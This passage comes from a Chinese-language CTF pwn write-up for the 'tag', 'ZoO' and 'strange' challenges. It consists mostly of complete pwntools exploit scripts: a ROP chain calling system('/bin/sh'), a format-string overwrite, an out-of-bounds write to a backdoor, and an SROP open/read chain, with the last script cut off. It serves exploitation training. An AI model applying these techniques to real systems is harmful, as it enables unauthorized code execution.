+</span></span><span style="display:flex;"><span>fun_addr <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> fun_addr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;funlockfile&#34;</span>]
+</span></span><span style="display:flex;"><span>system_addr <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;system&#34;</span>]
+</span></span><span style="display:flex;"><span>binsh_addr <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>))
+</span></span><span style="display:flex;"><span>pop_rdi_ret <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000000000002a3e5</span>
+</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> pie_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x101a</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;funlockfile_addr ===&gt; </span><span style="color:#e6db74">{</span>hex(fun_addr)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;libc_base ===&gt; </span><span style="color:#e6db74">{</span>hex(libc_base)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;system_addr ===&gt; </span><span style="color:#e6db74">{</span>hex(system_addr)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;binsh_addr ===&gt; </span><span style="color:#e6db74">{</span>hex(binsh_addr)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;pop_rdi_ret ===&gt; </span><span style="color:#e6db74">{</span>hex(pop_rdi_ret)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload3 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x110</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;dddddddd&#34;</span> <span style="color:#f92672">+</span> flat([pop_rdi_ret, binsh_addr, ret, system_addr])
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;You say:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>len(payload3) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(payload3)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="tag">tag</h2>
+<blockquote>
+<p>[mid] tag</p>
+<p>There is a fmt vulnerability, but it seems impossible to trigger.</p>
+</blockquote>
+<p>这题也不难，首先目标是把 v6 改成 1，可以发现在配对 tag 的时候，对于后标签只匹配了 <code>&lt;/</code>，导致可以 partial overwrite。</p>
+<p>把 old_char 设置成 <code>\x00</code>，<code>new_char</code> 设置成 <code>\x01</code>，然后就可以打格式化字符串了。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./pwn&#34;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> proc
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process(proc)
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(proc)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>G:
+</span></span><span style="display:flex;"><span>    gdb<span style="color:#f92672">.</span>attach(io)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input &gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&lt;&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;%11$p.%18$p.%29$p.bbbbbbbbb&lt;/&#34;</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;payload1 len ===&gt; </span><span style="color:#e6db74">{</span>len(payload1)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(payload1)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># one</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Old tag to replace [q to quit] &gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;New tag &gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># two</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Old tag to replace [q to quit] &gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;New tag &gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&lt;&#34;</span><span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>IO_fw_addr <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;.&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)<span style="color:#f92672">.</span>decode(), <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">45</span>
+</span></span><span style="display:flex;"><span>str_addr <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;.&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)<span style="color:#f92672">.</span>decode(), <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>stack_addr <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;.&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)<span style="color:#f92672">.</span>decode(), <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x200</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;IO_fw_addr ===&gt; </span><span style="color:#e6db74">{</span>hex(IO_fw_addr)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">str_addr ===&gt; </span><span style="color:#e6db74">{</span>hex(str_addr)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">stack_addr ===&gt; </span><span style="color:#e6db74">{</span>hex(stack_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>libc_addr <span style="color:#f92672">=</span> IO_fw_addr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;_IO_file_write&#34;</span>]
+</span></span><span style="display:flex;"><span>pie_addr <span style="color:#f92672">=</span> str_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x2069</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;libc_addr ===&gt; </span><span style="color:#e6db74">{</span>hex(libc_addr)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">pie_addr ===&gt; </span><span style="color:#e6db74">{</span>hex(pie_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ret_addr <span style="color:#f92672">=</span> stack_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x90</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;ret_addr ===&gt; </span><span style="color:#e6db74">{</span>hex(ret_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> pie_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000000000000101a</span>
+</span></span><span style="display:flex;"><span>system_addr <span style="color:#f92672">=</span> libc_addr <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]
+</span></span><span style="display:flex;"><span>binsh_addr <span style="color:#f92672">=</span> libc_addr <span style="color:#f92672">+</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>))
+</span></span><span style="display:flex;"><span>pop_rdi_ret <span style="color:#f92672">=</span> libc_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000000000002a3e5</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;system_addr ===&gt; </span><span style="color:#e6db74">{</span>hex(system_addr)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">binsh_addr ===&gt; </span><span style="color:#e6db74">{</span>hex(binsh_addr)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">pop_rdi_ret ===&gt; </span><span style="color:#e6db74">{</span>hex(pop_rdi_ret)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload2 <span style="color:#f92672">=</span> fmtstr_payload(<span style="color:#ae81ff">8</span>, {ret_addr: pop_rdi_ret, ret_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>: binsh_addr, ret_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span>: ret, ret_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">24</span>: system_addr}, write_size<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;short&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload2)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>顺带一提 pwntools 的 fmtstr_payload 针对 x64 的模块已经修好了，真好使啊<del>两年前还是坏的</del></p>
+<h2 id="zoo">ZoO</h2>
+<blockquote>
+<p>[hard] ZoO!</p>
+<p>Welcome to the zoo! You can feed the small animals here. The flag is placed in a location that you cannot touch.</p>
+<p>PS:
+The flag is a series of numbers, and the complete flag format is t1dctf{***}.</p>
+</blockquote>
+<p>这题折腾了挺久的，总算是完整复现出来了（（</p>
+<p>第一个点在于逆向结构体，这里总结了点[逆向结构体的经验](./&ldquo;the experience of reverse struct.md&rdquo;)。</p>
+<p>第二个点在于找溢出，不过如果第一个逆清楚了的话其实这里问题不大，显然是存在数组越界的，对于同一个 bin 可以创建 5 个 entry，前 4 个填满数组，第五个相当于越界读写，可以写 ret addr。</p>
+<p>第三个点在于找利用链，这个题没给任意地址写，只有部分地址写，所以没办法构造 ROP 链子完整泄漏 libc 打，但是题里有一个 <code>backdoor</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span><span style="color:#a6e22e">endbr64</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">push</span>    rbp
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span>     rbp, rsp
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span>     [rbp<span style="color:#f92672">+</span>var_8], rdi
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span>     [rbp<span style="color:#f92672">+</span>var_10], rsi
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pop</span>     rbp
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">retn</span>
+</span></span></code></pre></div><p>相当于会把 rdi 和 rsi 存下来，我们去 ret addr 看看，发现 ret 时 rdi 是 func1 里用到的 map 地址，rsi 是 <code>useless</code>，那么直接调用 view 函数就可以把 flag 打印出来。</p>
+<p>第四个点在于这个 view 函数不能从头开始调用，否则会 segment fault 退出，这是因为 gift 函数在 ret 时缺少了 <code>mov rsp, rbp</code>，解决方法也简单，从 <code>view + 5</code> 开始调用就行。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> sys <span style="color:#f92672">import</span> argv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./pwn&#34;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> proc
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(proc, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;&#34;</span>, ) <span style="color:#66d9ef">if</span> argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;r&#39;</span> <span style="color:#66d9ef">else</span> process(proc)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;ZoO!&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>G:
+</span></span><span style="display:flex;"><span>    gdb<span style="color:#f92672">.</span>attach(io, <span style="color:#e6db74">&#34;b *$rebase(0x1483)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">b *$rebase(0x1a07)&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">feed</span>(name, amount):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(name)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(str(amount)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># pause()</span>
+</span></span><span style="display:flex;"><span>feed(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>feed(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1F&#34;</span>, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>feed(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1FF&#34;</span>, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>feed(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1FFF&#34;</span>, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;four&#34;</span>)
+</span></span><span style="display:flex;"><span>feed(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1FFFF&#34;</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">0x4fc</span><span style="color:#f92672">+</span><span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="strange">strange</h2>
+<blockquote>
+<p>[Inferno] strange!?</p>
+<p>I heard you&rsquo;re good at orw? Give this a try!</p>
+<p>PS:
+This is not the kernel! This is not the kernel! This is not the kernel! But debugging techniques used for the kernel can be employed for debugging. Pay attention to subtle differences caused by local and system kernel versions!</p>
+</blockquote>
+<p>题目给了 qemu 启动脚本和一个内核文件系统，看看里面的 hello，发现是个没用调用任何库函数的 i386 程序，只开了 NX，提示打 orw。</p>
+<p>问题是程序本身的 gadgets 非常少。</p>
+<p>这里提一下 SROP，这里需要提一下，<code>sigreturn</code> 这个系统调用和别的系统调用有一个不同的地方，即一般的应用程序不会主动调用它，而是由内核将相应地址填到栈上，使得应用进程被动地调用。因此在系统中一般会有一段代码专门用来调用<code>sigreturn</code>，在不同的类UNIX系统中，这段代码会出现在不同的位置，如下图所示：</p>
+<p><img src="https://pic.imgdb.cn/item/6735971bd29ded1a8c516119.png" alt=""></p>
+<p>所以可以在这个 hello 程序的 vdso 里找到相当多的 gadgets。</p>
+<p>有一个点是 SROP 时需要把段寄存器设置正常，不然程序在系统调用的时候会 down 掉，一开始的时候不知道这个一直打不通闹麻了。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> sys <span style="color:#f92672">import</span> argv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./hello&#34;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> proc
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;i386&#39;</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(proc, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;&#34;</span>, ) <span style="color:#66d9ef">if</span> argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;r&#39;</span> <span style="color:#66d9ef">else</span> process(proc)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>G:
+</span></span><span style="display:flex;"><span>    gdb<span style="color:#f92672">.</span>attach(io)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>vdso_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xf7ffc000</span>
+</span></span><span style="display:flex;"><span>stack_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffccbc</span>
+</span></span><span style="display:flex;"><span>int_0x80 <span style="color:#f92672">=</span> vdso_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00000577</span>
+</span></span><span style="display:flex;"><span>read_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8049000</span>
+</span></span><span style="display:flex;"><span>sigreturn_addr <span style="color:#f92672">=</span> vdso_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00000591</span>
+</span></span><span style="display:flex;"><span>resigreturn_addr <span style="color:#f92672">=</span> vdso_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x5a0</span>
+</span></span><span style="display:flex;"><span>ret_addr <span style="color:#f92672">=</span> vdso_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000057c</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>frame <span style="color:#f92672">=</span> SigreturnFrame(kernel<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;i386&#39;</span>)
+</span></span><span style="display:flex;"><span>frame<span style="color:#f92672">.</span>eax <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span> <span style="color:#75715e"># open</span>
+</span></span><span style="display:flex;"><span>frame<span style="color:#f92672">.</span>ebx <span style="color:#f92672">=</span> stack_addr
+</span></span><span style="display:flex;"><span>frame<span style="color:#f92672">.</span>ecx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>frame<span style="color:#f92672">.</span>edx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>frame<span style="color:#f92672">.</span>ebp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>frame<span style="color:#f92672">.</span>eip <span style="color:#f92672">=</span> int_0x80
+</span></span><span style="display:flex;"><span>frame<span style="color:#f92672">.</span>esp <span style="color:#f92672">=</span> stack_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x24</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 段寄存器要恢复</span>
+</span></span><span style="display:flex;"><span>frame<span style="color:#f92672">.</span>cs <span style="color:#f92672">=</span> <span style="color:#ae81ff">35</span>
+</span></span><span style="display:flex;"><span>frame<span style="color:#f92672">.</span>ss <span style="color:#f92672">=</span> <span style="color:#ae81ff">43</span>
+</span></span><span style="display:flex;"><span>frame<span style="color:#f92672">.</span>ds <span style="color:#f92672">=</span> <span style="color:#ae81ff">43</span>
+</span></span><span style="display:flex;"><span>frame<span style="color:#f92672">.</span>es <span style="color:#f92672">=</span> <span style="color:#ae81ff">43</span>
+</span></span><span style="display:flex;"><span>frame<span style="color:#f92672">.</span>fs <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>frame<span style="color:#f92672">.</span>gs <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>frame2 <span style="color:#f92672">=</span> SigreturnFrame(kernel<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;i386&#39;</span>)
+</span></span><span style="display:flex;"><span>frame2<span style="color:#f92672">.</span>eax <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span> <span style="color:#75715e"># read</span>
+</span></span><span style="display:flex;"><span>frame2<span style="color:#f92672">.</span>ebx <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>frame2<span style="color:#f92672">.</span>ecx <span style="color:#f92672">=</span> stack_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x200</span>
+</span></span><span style="display:flex;"><span>frame2<span style="color:#f92672">.</span>edx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20</span>
+</span></span><span style="display:flex;"><span>frame2<span style="color:#f92672">.</span>eip <span style="color:#f92672">=</span> int_0x80
